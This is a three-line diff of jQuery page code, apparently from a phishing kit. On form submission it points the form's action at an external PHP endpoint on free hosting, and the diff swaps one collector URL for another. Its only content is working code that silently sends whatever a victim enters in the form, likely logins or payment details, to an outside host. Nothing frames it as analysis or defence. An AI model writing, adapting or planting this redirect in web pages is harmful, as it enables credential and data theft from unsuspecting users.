@@ -1,3 +1,3 @@
 $("form").submit(function() {
-  $(myform).attr("action", "https://newyears-duaribuduaempat-go.000webhostapp.com/reguler/iurann.php");
+  $(myform).attr("action", "https://royoan-duaribuduaempat-comeon.000.pe/royoan/sauss.php");
 });
